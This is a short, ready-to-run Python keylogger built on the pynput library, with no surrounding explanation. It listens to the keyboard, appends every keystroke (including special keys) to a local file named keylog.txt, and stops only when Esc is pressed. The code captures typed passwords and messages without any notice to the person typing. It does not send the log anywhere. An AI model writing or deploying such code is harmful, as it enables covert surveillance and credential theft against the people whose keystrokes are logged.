pip install pynput
from pynput import keyboard

def on_press(key):
    try:
        with open("keylog.txt", "a") as log_file:
            log_file.write(str(key.char))
    except AttributeError:
        # Handles special keys (space, enter, etc.)
        with open("keylog.txt", "a") as log_file:
            log_file.write(f'[{key}]')

def on_release(key):
    # Optional: Stop listener if needed
    if key == keyboard.Key.esc:
        return False  # Stop the keylogger

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
